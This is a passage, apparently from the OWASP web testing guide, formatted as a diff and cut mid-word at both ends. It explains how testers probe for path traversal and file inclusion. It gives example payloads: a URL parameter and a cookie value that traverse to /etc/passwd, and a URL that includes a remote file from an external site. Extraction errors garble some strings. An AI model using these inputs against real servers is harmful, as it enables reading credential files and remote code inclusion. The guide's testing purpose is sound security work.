@@ -1,0 +1,22 @@
+niques
+The next stage of testing is analyzing the input validation functions
+present in the web application. Using the previous example, the dy-
+namic page called getUserProfile.jsp loads static information from a
+file and shows the content to users, An attacker could insert the mali-
+cious string “./../../../etc/passwa" to include the password hash file of
+a Linux/UNIX system. Obviously, this kind of attack is possible only if
+the validation checkpoint fails; according to the file system privileges,
+the web application itself must be able to read the file.
+To successfully test for this flaw, the tester needs to have knowledge
+of the system being tested and the location of the files being request-
+ed. There is no point requesting /etc/passwd from an IIS web server.
+http:/example.com/getUserProfilejsp?item=../../../../etc/passwd
+For the cookies example:
+Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
+It's also possible to include files and scripts located on external web-
+site.
+http:/example.com/index.php?file=http:/www.owasp.org/
+malicioustxt
+The following example will demonstrate how it is possible to show
+the source code of a CGI component, without using any path traversal
+ch
